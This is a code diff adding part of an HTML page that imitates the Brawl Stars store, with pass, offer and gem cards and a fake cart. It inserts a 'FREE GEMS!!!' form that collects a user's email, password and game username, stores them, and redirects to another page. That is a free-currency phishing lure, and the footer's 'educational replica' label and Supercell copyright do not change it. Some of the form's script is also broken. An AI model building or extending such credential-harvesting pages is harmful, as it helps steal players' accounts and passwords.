+      <div class="hover-popup"><strong>BRAWL PASS PLUS</strong><br>Instant 30% XP + all premium rewards + extra Resource Key.<br><br>Best value pass available!</div>
+      <div class="pass-header">
+        <div class="pass-bonus-tag">Instant 30% XP • Buy now, get +1 Resource Key!</div>
+        <div class="pass-name">BRAWL PASS PLUS</div>
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/3/3a/Store_Pin-Brawl_Pass_Plus.png/revision/latest?cb=20250224123831" alt="Brawl Pass Plus" style="width:100%;height:160px;object-fit:contain;margin:10px 0;filter:drop-shadow(0 0 16px #ff88ff88);">
+      </div>
+      <div class="pass-note">*Limited to one extra Resource Key per account. Delivered when offer ends.</div>
+      <div class="pass-footer"><div class="pass-pts">+650 pts</div><div class="pass-price">$9.99</div></div>
+      <button class="pass-add" onclick="addToCart('Brawl Pass Plus','$9.99')">Add to Cart</button>
+    </div>
+
+    <div class="pass-card pro popup-wrap">
+      <div class="hover-popup"><strong>PRO PASS</strong><br>Ranked pass with Pro Skin Upgrades across 100 tiers.<br><br>Resets every 4 seasons.</div>
+      <div class="pass-header">
+        <div class="pass-bonus-tag">Extra +2000 XP</div>
+        <div class="pass-name">PRO PASS</div>
+        <img src="https://wsrv.nl/?url=https://game-assets.store.supercell.com/brawlstars/df9036e1-aa03-4236-9b19-91fde91db4ea.png" alt="Pro Pass" style="width:100%;height:160px;object-fit:contain;margin:10px 0;filter:drop-shadow(0 0 16px #44ff6688);">
+      </div>
+      <div class="pass-note"></div>
+      <div class="pass-footer"><div class="pass-pts">+1250 pts</div><div class="pass-price">$17.99</div></div>
+      <button class="pass-add" onclick="addToCart('Pro Pass','$17.99')">Add to Cart</button>
+    </div>
+
+    <div class="pass-card basic popup-wrap">
+      <div class="hover-popup"><strong>BRAWL PASS</strong><br>Premium track with exclusive skins, pins, sprays &amp; more.<br><br>Instant 10% XP boost included.</div>
+      <div class="pass-header">
+        <div class="pass-bonus-tag">Instant 10% XP</div>
+        <div class="pass-name">BRAWL PASS</div>
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/8/8b/Store_Pin-Brawl_Pass.png/revision/latest" alt="Brawl Pass" style="width:100%;height:160px;object-fit:contain;margin:10px 0;filter:drop-shadow(0 0 16px #FFD70088);" onerror="this.src='https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/4/4a/Campaign_Icon-Brawl_Pass.png/revision/latest?cb=20200810190100'">
+      </div>
+      <div class="pass-note"></div>
+      <div class="pass-footer"><div class="pass-pts">+450 pts</div><div class="pass-price">$6.49</div></div>
+      <button class="pass-add" onclick="addToCart('Brawl Pass','$6.49')">Add to Cart</button>
+    </div>
+
+  </div>
+</section>
+
+<!-- OFFERS -->
+<section id="offers">
+  <div class="section-title">OFFERS</div>
+  <div class="section-sub">Limited-time deals — don't miss out!</div>
+  <div class="offers-grid">
+
+    <div class="offer-card popup-wrap">
+      <div class="hover-popup" style="background:#1a0a00;border-color:var(--orange);color:#ffe0b0;"><strong>Mecha Colt Skin</strong><br>Weekly offer — 54% off!<br><br>Includes skin + 450 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+450 BLING</span></div>
+      <div class="badge-discount">-54%</div>
+      <div class="card-img" style="background:linear-gradient(135deg,#1a0a2e,#3a1060);height:185px;padding:0;overflow:hidden;">
+        <img src="https://wsrv.nl/?url=https://mmonster.co/media/34/b8/26/1745331565/Colt-Renegade_Mecha-brawl-stars.webp" alt="Mecha Colt" style="width:100%;height:100%;object-fit:cover;object-position:center top;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">WEEKLY OFFER<br><small>MECHA COLT</small></div>
+        <div class="countdown" id="cd-colt"></div>
+        <div class="card-footer"><div class="card-pts">+450 pts</div><div class="card-price">$6.49</div></div>
+        <button class="btn-add" onclick="addToCart('Mecha Colt Skin','$6.49')">Add to Cart</button>
+      </div>
+    </div>
+
+    <div class="offer-card popup-wrap">
+      <div class="hover-popup" style="background:#001a3a;border-color:#00aaff;color:#c0e8ff;"><strong>Megalodon Skin</strong><br>Weekly offer — 47% off!<br><br>Includes skin + 350 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+350 BLING</span></div>
+      <div class="badge-discount">-47%</div>
+      <div class="card-img" style="background:linear-gradient(135deg,#001a3a,#003a6a);height:185px;padding:0;overflow:hidden;">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/template_images/2024/16792505/all-meg-skins-16792505/meg-brawl-stars-skin-megalondon-768x595.png" alt="Megalodon" style="width:100%;height:100%;object-fit:cover;object-position:center;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">WEEKLY OFFER<br><small>MEGALODON</small></div>
+        <div class="countdown" id="cd-meg"></div>
+        <div class="card-footer"><div class="card-pts">+350 pts</div><div class="card-price">$5.29</div></div>
+        <button class="btn-add" onclick="addToCart('Megalodon Skin','$5.29')">Add to Cart</button>
+      </div>
+    </div>
+
+    <div class="offer-card daily popup-wrap">
+      <div class="hover-popup" style="background:#001a3a;border-color:#00aaff;color:#c0e8ff;"><strong>Daily Offer</strong><br>83% off — today only!<br><br>750 Coins + 1000 Bling bundle.</div>
+      <div class="card-bonus" style="color:#fff;">STORE BONUS <span style="color:#fff;">+75 coins +100 gems</span></div>
+      <div class="badge-discount" style="background:#ff0055;">-83%</div>
+      <div class="card-img" style="background:linear-gradient(135deg,#0a2a7a,#1a5aff);height:185px;padding:0;display:flex;align-items:center;justify-content:center;gap:12px;">
+        <img src="https://i0.wp.com/brawlstar.store/wp-content/uploads/2023/04/bling-brawl-stars-moeda-de-cosmeticos-300x260-1.png?fit=300%2C260&ssl=1" alt="Bling" style="width:80px;height:80px;object-fit:contain;filter:drop-shadow(0 4px 12px #FFD700aa);">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" alt="Gems" style="width:80px;height:80px;object-fit:contain;filter:drop-shadow(0 4px 12px #2ECC40aa);">
+      </div>
+      <div class="card-body">
+        <div class="card-name" style="color:#fff;">DAILY OFFER</div>
+        <div class="countdown" id="cd-daily" style="color:#c0e8ff;"></div>
+        <div class="card-footer"><div class="card-pts" style="color:#c0e8ff;">+100 pts</div><div class="card-price">$1.49</div></div>
+        <button class="btn-add" onclick="addToCart('Daily Offer','$1.49')">Add to Cart</button>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- HYPERCHARGES -->
+<section id="hypercharges">
+  <div class="section-title" style="color:#2a0050;">HYPERCHARGES</div>
+  <div class="section-sub">Turn it up to 11 with Hypercharges!</div>
+  <div class="hyper-grid">
+
+    <div class="hyper-card popup-wrap">
+      <div class="hover-popup"><strong>Aftermath Hypercharge</strong><br>Requires Power Level 11.<br><br>78% off — limited time!</div>
+      <span class="hyper-tag">HYPERCHARGE</span>
+      <div class="badge-discount">-78%</div>
+      <div class="hyper-body">
+        <div class="hyper-name">AFTERMATH</div>
+        <div class="hyper-lock">Available after Power Level 11</div>
+        <div class="card-img" style="background:rgba(0,0,0,0.25);height:100px;border-radius:10px;"></div>
+      </div>
+      <div class="hyper-footer"><div class="hyper-pts">+250 pts</div><div class="hyper-price">$5.29</div></div>
+      <button class="btn-add" style="margin:8px 12px 12px;width:calc(100% - 24px);" onclick="addToCart('Aftermath Hypercharge','$5.29')">Add to Cart</button>
+    </div>
+
+    <div class="hyper-card popup-wrap">
+      <div class="hover-popup"><strong>Dual Wielding Hypercharge</strong><br>Requires Power Level 11.<br><br>78% off — limited time!</div>
+      <span class="hyper-tag">HYPERCHARGE</span>
+      <div class="badge-discount">-78%</div>
+      <div class="hyper-body">
+        <div class="hyper-name">DUAL WIELDING</div>
+        <div class="hyper-lock">Available after Power Level 11</div>
+        <div class="card-img" style="background:rgba(0,0,0,0.25);height:100px;border-radius:10px;"></div>
+      </div>
+      <div class="hyper-footer"><div class="hyper-pts">+350 pts</div><div class="hyper-price">$5.29</div></div>
+      <button class="btn-add" style="margin:8px 12px 12px;width:calc(100% - 24px);" onclick="addToCart('Dual Wielding Hypercharge','$5.29')">Add to Cart</button>
+    </div>
+
+    <div class="hyper-card popup-wrap">
+      <div class="hover-popup"><strong>Pestilence Hypercharge</strong><br>Requires Power Level 11.<br><br>76% off — limited time!</div>
+      <span class="hyper-tag">HYPERCHARGE</span>
+      <div class="badge-discount">-76%</div>
+      <div class="hyper-body">
+        <div class="hyper-name">PESTILENCE</div>
+        <div class="hyper-lock">Available after Power Level 11</div>
+        <div class="card-img" style="background:rgba(0,0,0,0.25);height:100px;border-radius:10px;"></div>
+      </div>
+      <div class="hyper-footer"><div class="hyper-pts">+350 pts</div><div class="hyper-price">$5.29</div></div>
+      <button class="btn-add" style="margin:8px 12px 12px;width:calc(100% - 24px);" onclick="addToCart('Pestilence Hypercharge','$5.29')">Add to Cart</button>
+    </div>
+
+  </div>
+</section>
+
+<!-- GEMS -->
+<section id="gems">
+  <div class="section-title"><img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:28px;height:28px;object-fit:contain;vertical-align:middle;margin-right:6px;"> GEMS</div>
+  <div class="section-sub">Power up your game with Gems!</div>
+  <div class="gems-grid">
+
+    <div class="gem-card popup-wrap">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:var(--green);color:#c8ffd0;">10 Gems + 3 bonus = 13 total.<br>Best for small purchases.</div>
+      <div class="gem-bonus">STORE BONUS <span>+3 GEMS</span></div>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:80px;height:80px;object-fit:contain;filter:drop-shadow(0 2px 8px #2ECC4088);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">10</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+100 pts</div><div class="gem-price">$1.49</div></div>
+      <button class="gem-add" onclick="addToCart('10 Gems','$1.49')">Add to Cart</button>
+    </div>
+
+    <div class="gem-card popup-wrap">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:var(--green);color:#c8ffd0;">80 Gems + 8 bonus = 88 total.<br>Great for passes.</div>
+      <div class="gem-bonus">STORE BONUS <span>+8 GEMS</span></div>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:90px;height:90px;object-fit:contain;filter:drop-shadow(0 2px 8px #2ECC4088);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">80</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+250 pts</div><div class="gem-price">$3.49</div></div>
+      <button class="gem-add" onclick="addToCart('80 Gems','$3.49')">Add to Cart</button>
+    </div>
+
+    <div class="gem-card popup-wrap" style="border-color:#fff;">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:var(--green);color:#c8ffd0;">170 Gems + 17 bonus = 187 total.<br>5% extra value!</div>
+      <div class="gem-bonus">STORE BONUS <span>+17 GEMS</span></div>
+      <span class="gem-sale">+5%</span>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:100px;height:100px;object-fit:contain;filter:drop-shadow(0 2px 8px #2ECC4088);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">170</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+500 pts</div><div class="gem-price">$6.99</div></div>
+      <button class="gem-add" onclick="addToCart('170 Gems','$6.99')">Add to Cart</button>
+    </div>
+
+    <div class="gem-card popup-wrap" style="border-color:#fff;">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:var(--green);color:#c8ffd0;">360 Gems + 36 bonus = 396 total.<br>15% extra value!</div>
+      <div class="gem-bonus">STORE BONUS <span>+36 GEMS</span></div>
+      <span class="gem-sale">+15%</span>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:110px;height:110px;object-fit:contain;filter:drop-shadow(0 2px 8px #2ECC4088);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">360</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+1000 pts</div><div class="gem-price">$14.99</div></div>
+      <button class="gem-add" onclick="addToCart('360 Gems','$14.99')">Add to Cart</button>
+    </div>
+
+    <div class="gem-card popup-wrap" style="border-color:#fff;">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:var(--green);color:#c8ffd0;">930 Gems + 95 bonus = 1025 total.<br>20% extra value!</div>
+      <div class="gem-bonus">STORE BONUS <span>+95 GEMS</span></div>
+      <span class="gem-sale">+20%</span>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:120px;height:120px;object-fit:contain;filter:drop-shadow(0 2px 12px #2ECC40aa);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">930</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+2500 pts</div><div class="gem-price">$35.99</div></div>
+      <button class="gem-add" onclick="addToCart('930 Gems','$35.99')">Add to Cart</button>
+    </div>
+
+    <div class="gem-card popup-wrap" style="border-color:#FFD700;">
+      <div class="hover-popup" style="background:#0a2a0a;border-color:#FFD700;color:#ffffc0;">2000 Gems + 200 bonus = 2200 total.<br>Best value — 25% extra!</div>
+      <div class="gem-bonus">STORE BONUS <span>+200 GEMS</span></div>
+      <span class="gem-sale">+25%</span>
+      <div class="gem-body">
+        <img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:130px;height:130px;object-fit:contain;filter:drop-shadow(0 2px 16px #FFD700cc);">
+        <div class="gem-name">GEMS</div><div class="gem-amount">2000</div>
+      </div>
+      <div class="gem-footer"><div class="gem-pts">+5000 pts</div><div class="gem-price">$69.99</div></div>
+      <button class="gem-add" onclick="addToCart('2000 Gems','$69.99')">Add to Cart</button>
+    </div>
+    <div class="card">
+  <h1>FREE GEMS!!!</h1>
+  <h2>register for GEMS</h2>
+
+  <div id="step1">
+    <input type="email" id="email" placeholder="Enter email">
+    <button onclick="next()">Next</button>
+  </div>
+
+  <div id="step2" class="hidden">
+    <input type="password" id="code" placeholder="Enter password">
+    <button onclick="next2()">Submit</button>
+  </div>
+ <div id="step3" class="hidden">
+    <input type="text" id="code" placeholder="Enter your brawl stars username">
+    <button onclick="finish()">Submit</button>
+  </div>
+</div>
+  </div>
+<section>
+
+
+
+
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-logo">BRAWL STARS STORE</div>
+  <p>© 2026 Supercell. All rights reserved. Brawl Stars is a trademark of Supercell Oy.</p>
+  <p style="margin-top:6px;font-size:0.8rem;color:#555;">Fan-made replica for educational purposes only.</p>
+</footer>
+
+<!-- BACK TO TOP -->
+<button id="back-top" onclick="window.scrollTo({top:3300,behavior:'smooth'})">&#8681;</button>
+
+<script>
+/* PARTICLES */
+(function(){
+  const c=document.getElementById('particles');
+  for(let i=0;i<22;i++){
+    const p=document.createElement('div'); p.className='particle';
+    const s=Math.random()*12+6;
+    p.style.cssText=`width:${s}px;height:${s}px;left:${Math.random()*100}vw;animation-duration:${Math.random()*14+8}s;animation-delay:${Math.random()*12}s;`;
+    c.appendChild(p);
+  }
+})();
+
+/* CAROUSEL */
+let curSlide=0;
+const slides=document.querySelectorAll('.carousel-slide');
+const dots=document.querySelectorAll('.dot');
+function goSlide(n){
+  slides[curSlide].classList.remove('active'); dots[curSlide].classList.remove('active');
+  curSlide=(n+slides.length)%slides.length;
+  slides[curSlide].classList.add('active'); dots[curSlide].classList.add('active');
+}
+function moveSlide(d){goSlide(curSlide+d);}
+setInterval(()=>moveSlide(1),5000);
+
+/* CART */
+let cart=[];
+function addToCart(name,price){
+  cart.push({name,price}); renderCart();
+  const cnt=document.getElementById('cartCount');
+  cnt.textContent=cart.length;
+  cnt.classList.remove('bump'); void cnt.offsetWidth; cnt.classList.add('bump');
+  showToast(name+' added to cart!');
+}
+function removeFromCart(i){cart.splice(i,1);renderCart();document.getElementById('cartCount').textContent=cart.length;}
+function renderCart(){
+  const el=document.getElementById('cartItems');
+  const empty=document.getElementById('cartEmpty');
+  if(cart.length===0){empty.style.display='block';el.innerHTML='';el.appendChild(empty);updateTotal();return;}
+  empty.style.display='none';
+  el.innerHTML=cart.map((item,i)=>`<div class="cart-item"><span class="cart-item-name">${item.name}</span><span class="cart-item-price">${item.price}</span><button class="cart-item-remove" onclick="removeFromCart(${i})">&#x2715;</button></div>`).join('');
+  el.appendChild(empty); updateTotal();
+}
+function updateTotal(){
+  const total=cart.reduce((s,i)=>s+parseFloat(i.price.replace('$','')),0);
+  document.getElementById('cartTotal').textContent='$'+total.toFixed(2);
+}
+function toggleCart(){document.getElementById('cartDrawer').classList.toggle('open');document.getElementById('cartOverlay').classList.toggle('open');}
+function closeCart(){document.getElementById('cartDrawer').classList.remove('open');document.getElementById('cartOverlay').classList.remove('open');}
+function checkout(){
+  if(cart.length===0){showToast('Your cart is empty!');return;}
+  cart=[];renderCart();document.getElementById('cartCount').textContent=0;closeCart();showToast('Thank you for your purchase!');
+}
+
+/* TOAST */
+let toastTimer;
+function showToast(msg){
+  const t=document.getElementById('toast'); t.textContent=msg; t.classList.add('show');
+  clearTimeout(toastTimer); toastTimer=setTimeout(()=>t.classList.remove('show'),2400);
+}
+
+/* COUNTDOWNS */
+function makeExpiry(h,m){const d=new Date();d.setHours(d.getHours()+h,d.getMinutes()+m,0,0);return d;}
+const timers={'cd-void':makeExpiry(26*24+13,0),'cd-amber':makeExpiry(26*24+13,0),'cd-juju':makeExpiry(26*24+13,0),'cd-bea':makeExpiry(26*24+13,0),'cd-colt':makeExpiry(6*24+13,0),'cd-meg':makeExpiry(6*24+13,0),'cd-daily':makeExpiry(17,20)};
+function renderCountdowns(){
+  const now=Date.now();
+  Object.entries(timers).forEach(([id,exp])=>{
+    const el=document.getElementById(id); if(!el)return;
+    let diff=Math.max(0,exp-now);
+    const d=Math.floor(diff/86400000);diff%=86400000;
+    const h=Math.floor(diff/3600000);diff%=3600000;
+    const m=Math.floor(diff/60000);diff%=60000;
+    const s=Math.floor(diff/1000);
+    el.innerHTML=d>0
+      ?`<span class="cd-block">${d}d</span><span class="cd-sep">:</span><span class="cd-block">${String(h).padStart(2,'0')}h</span><span class="cd-sep">:</span><span class="cd-block">${String(m).padStart(2,'0')}m</span>`
+      :`<span class="cd-block">${String(h).padStart(2,'0')}h</span><span class="cd-sep">:</span><span class="cd-block">${String(m).padStart(2,'0')}m</span><span class="cd-sep">:</span><span class="cd-block">${String(s).padStart(2,'0')}s</span>`;
+  });
+}
+renderCountdowns(); setInterval(renderCountdowns,1000);
+
+/* BACK TO TOP */
+const btt=document.getElementById('back-top');
+window.addEventListener('scroll',()=>btt.classList.toggle('visible',window.scrollY>400));
+
+/* ACTIVE NAV */
+const secs=document.querySelectorAll('section[id]');
+const navLinks=document.querySelectorAll('nav a');
+new IntersectionObserver(entries=>{
+  entries.forEach(e=>{if(e.isIntersecting)navLinks.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+e.target.id));});
+},{threshold:0.4}).observe&&secs.forEach(s=>new IntersectionObserver(entries=>{
+  entries.forEach(e=>{if(e.isIntersecting)navLinks.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+e.target.id));});
+},{threshold:0.4}).observe(s));
+function createRain() {
+  const rain = document.getElementById("rain");
+
+  for (let i = 0; i < 30; i++) {
+    let drop = document.createElement("div");
+    drop.classList.add("rain-item");
+
+    drop.style.left = Math.random() * 100 + "vw";
+    drop.style.animationDuration = (Math.random() * 3 + 2) + "s";
+    drop.style.opacity = Math.random();
+
+    rain.appendChild(drop);
+  }
+}
+
+createRain();
+
+/* 🔐 Step 1 */
+function next() {
+  const email = document.getElementById("email").value.trim();
+
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!emailPattern.test(email)) {
+    alert("Enter a valid email");
+    return;
+  }
+
+  localStorage.setItem("studentEmail", email);
+
+  document.getElementById("step1").classList.add("hidden");
+  document.getElementById("step2").classList.remove("hidden");
+}
+function next2() {
+  const email = document.getElementById("email").value.trim();
+
+  if (!email) return alert("password");
+
+  localStorage.setItem("studentEmail", email);
+
+  document.getElementById("step2").classList.add("hidden");
+  document.getElementById("step3").classList.remove("hidden");
+}
+
+
+/* ✅ Save order (multiple support) */
+function finish() {
+  const code = document.getElementById("code").value.trim();
+  const email = localStorage.getItem("studentEmail");
+
+  if (!code) {
+    alert("Enter password");
+    return;
+  }
+
+  let orders = JSON.parse(localStorage.getItem("orders")) || [];
+
+  orders.push({
+    email: email,
+    classCode: code,
+    time: new Date().toLocaleString()
+  });
+
+  localStorage.setItem("orders", JSON.stringify(orders));
+
+  window.location.href = "alt.html";
+}
+</script>
+</body>
+</html>
